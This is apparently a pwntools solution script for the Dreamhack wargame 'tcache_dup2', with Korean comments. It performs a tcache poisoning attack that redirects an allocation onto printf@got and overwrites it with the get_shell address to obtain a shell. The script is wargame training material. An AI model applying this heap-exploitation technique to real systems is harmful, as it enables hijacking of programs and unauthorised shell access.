from pwn import *

p = remote('host3.dreamhack.games', 17171)
elf = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')
# tcache[0x20] : empty
# chunk : ptr[1]
create(0x20, b'b')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[1]
delete(0)
# tcache[0x20] : ptr[1] -> ptr[0]
# tc_idx = 2
# chunk : ptr[1]
delete(1)


# tcache[0x20] : ptr[1] -> printf@got
# tc_idx = 2
# chunk : ptr[1]
printf_got = elf.got['printf']
modify(1, 0x10, p64(printf_got))


# tcache[0x20] : printf@got
# tc_idx = 1
# chunk : ptr[2]
create(0x20, b'a')


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[3]
get_shell = elf.symbols['get_shell']
create(0x20, p64(get_shell))
# tcache에서 청크를 찾아서 할당할 때 해당 청크에 `e->key = NULL;`을 해서 `청크 + 0x8`을 `0x00`으로 초기화하기 때문에,
# 여기서 printf@got를 할당할 때, [printf@got + 0x8]에 위치하는 read@got의 값이 NULL(0x00)으로 바뀜
# tcache_dup 워게임에서는 printf@got 뒤에 alarm@got가 존재해서 상관없지만, 여기서는 create 내부에서 read로 데이터에 get_shell을 대입해야 하므로 read@got를 수정하면 안됨

p.interactive()
